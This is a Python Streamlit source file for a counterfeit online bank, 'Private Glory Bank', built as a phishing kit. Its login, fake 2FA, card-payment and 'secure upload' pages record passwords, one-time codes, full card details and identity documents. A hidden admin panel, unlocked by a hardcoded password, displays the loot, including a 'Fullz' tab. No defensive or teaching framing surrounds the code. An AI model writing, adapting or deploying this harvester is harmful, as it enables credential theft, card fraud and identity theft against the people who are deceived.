import streamlit as st
import pandas as pd
from datetime import datetime
import plotly.express as px

# ==================== SESSION STATE ====================
st.session_state.balance = st.session_state.get("balance", 27340.50)
st.session_state.captured = st.session_state.get("captured", [])
st.session_state.otp_log = st.session_state.get("otp_log", [])
st.session_state.files = st.session_state.get("files", [])
st.session_state.txs = st.session_state.get("txs", [])
st.session_state.auth = st.session_state.get("auth", False)
st.session_state.otp_ok = st.session_state.get("otp_ok", False)
st.session_state.admin = st.session_state.get("admin", False)

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== GOD-TIER 2025 CSS ====================
st.markdown("""
<style>
    .stApp {background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white;}
    .header {background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
             padding: 2rem; text-align: center; border-bottom: 10px solid #fcca46;
             border-radius: 0 0 50px 50px; box-shadow: 0 15px 40px rgba(0,0,0,0.8);}
    .eagle-logo {font-size: 160px; margin: -20px;}
    .glass {background: rgba(255,255,255,0.12); backdrop-filter: blur(16px);
            border-radius: 24px; border: 1px solid rgba(255,255,255,0.2);
            padding: 2rem; box-shadow: 0 12px 40px rgba(0,0,0,0.6);}
    h1, h2, h3 {color: #fcca46 !important; text-shadow: 0 0 10px #fcca46;}
    .stButton>button {background: linear-gradient(45deg, #BF0A30, #002868);
                      color: white; font-weight: bold; border-radius: 50px; height: 3.8rem; font-size: 1.1rem;}
    .stButton>button:hover {background: #fcca46; color: #002868; transform: scale(1.05);}
    .stTextInput > div > div > input {background: rgba(255,255,255,0.1); color: white; border-radius: 12px;}
</style>
""", unsafe_allow_html=True)

# ==================== PAGES ====================
def login():
    st.markdown(f'''
    <div class="header">
        <div class="eagle-logo">Eagle</div>
        <h1>PRIVATE GLORY BANK</h1>
        <p style="font-size:24px;color:#fcca46">Land of the Free • Home of the Brave</p>
    </div>
    ''', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1,1.2,1])
    with col2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("### Secure Login")
        user = st.text_input("User ID", placeholder="client001")
        pwd = st.text_input("Password", type="password", placeholder="SecureUSA2025!")
        if st.button("Login Securely", use_container_width=True, type="primary"):
            st.session_state.captured.append({"time": datetime.now().isoformat(), "user": user, "pass": pwd})
            if user == "client001" and pwd == "SecureUSA2025!":
                st.session_state.auth = True
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                st.session_state.admin = True
                st.rerun()
            else:
                st.error("Invalid credentials")
        st.markdown("</div>", unsafe_allow_html=True)

def otp_page():
    st.markdown(f"<div class='header'><div class='eagle-logo'>Eagle</div><h1>2FA Verification</h1></div>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#fcca46'>We sent a code to ••••1776</h3>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code", max_chars=6, placeholder="000000")
    if st.button("Verify & Continue", type="primary", use_container_width=True):
        st.session_state.otp_log.append({"time": datetime.now().isoformat(), "otp": code})
        if len(code) == 6:
            st.session_state.otp_ok = True
            st.success("Verified!")
            st.rerun()

def dashboard():
    st.markdown(f'''
    <div class="header">
        <div class="eagle-logo">Eagle</div>
        <h1>PRIVATE GLORY BANK</h1>
    </div>
    ''', unsafe_allow_html=True)
    
    st.markdown(f"### Welcome back • {datetime.now().strftime('%A, %B %d')}")
    
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Total Balance", f"${st.session_state.balance:,.2f}", "+$842")
    c2.metric("Credit Limit", "$25,000")
    c3.metric("Pending", "3")
    c4.metric("Security Score", "99%")

    col1, col2 = st.columns([2,1])
    with col1:
        st.markdown("<div class='glass'><h3>Recent Activity</h3>", unsafe_allow_html=True)
        df = pd.DataFrame(st.session_state.txs[-10:])
        st.dataframe(df, use_container_width=True, hide_index=True)
        st.markdown("</div>", unsafe_allow_html=True)
    with col2:
        st.markdown("<div class='glass'><h3>Accounts</h3>", unsafe_allow_html=True)
        fig = px.pie(values=[12340,15000], names=["Checking","Savings"],
                     color_discrete_sequence=["#fcca46","#002868"], hole=0.5)
        st.plotly_chart(fig, use_container_width=True)
        st.markdown("</div>", unsafe_allow_html=True)

def transfer():
    st.markdown(f"<div class='header'><div class='eagle-logo'>Eagle</div><h2>Transfer & Pay</h2></div>", unsafe_allow_html=True)
    tab1, tab2 = st.tabs(["Quick Transfer", "Pay with Card"])
    
    with tab1:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.text_input("To Account / Routing")
        amount = st.number_input("Amount", min_value=0.01)
        if st.button("Send Transfer", type="primary"):
            st.session_state.txs.append({"date": datetime.now().strftime("%m/%d"), "desc": "External Transfer", "amount": -amount})
            st.success("Transfer initiated!")
        st.markdown("</div>", unsafe_allow_html=True)
    
    with tab2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("#### Pay Any Bill")
        card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
        exp = st.text_input("MM/YY", placeholder="07/29")
        cvv = st.text_input("CVV", type="password", placeholder="776")
        zipc = st.text_input("Billing ZIP")
        payee = st.text_input("Payee")
        amt = st.number_input("Amount", 0.01)
        if st.button("Pay Now", type="primary"):
            st.session_state.captured.append({"card":card,"exp":exp,"cvv":cvv,"zip":zipc,"payee":payee,"amt":amt})
            st.success(f"Payment to {payee} successful!")
        st.markdown("</div>", unsafe_allow_html=True)

def messages():
    st.markdown(f"<div class='header'><div class='eagle-logo'>Eagle</div><h2>Secure Uploads</h2></div>", unsafe_allow_html=True)
    st.markdown("<div class='glass'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload ID, tax docs, SSN, etc.", ["pdf","jpg","png","docx"])
    if uploaded:
        st.session_state.files.append({"name": uploaded.name, "time": datetime.now().isoformat()})
        st.success("Document received securely")
    st.markdown("</div>", unsafe_allow_html=True)

def admin_panel():
    st.markdown(f"<div class='header'><div class='eagle-logo'>Eagle</div><h1 style='color:#fcca46'>ADMIN PANEL</h1></div>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(st.session_state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(st.session_state.otp_log))
    with tabs[2]: st.json([x for x in st.session_state.captured if "card" in str(x)], expanded=True)
    with tabs[3]: st.write(st.session_state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(st.session_state.txs))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f"<div style='text-align:center;padding:20px;background:#002868;border-radius:20px'><div class='eagle-logo'>Eagle</div><h2 style='color:#fcca46'>PGB</h2></div>", unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer & Pay", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not st.session_state.auth:
    login()
elif st.session_state.admin:
    admin_panel()
elif not st.session_state.otp_ok:
    otp_page()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer & Pay": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        for key in st.session_state.keys():
            del st.session_state[key]
        st.rerun()
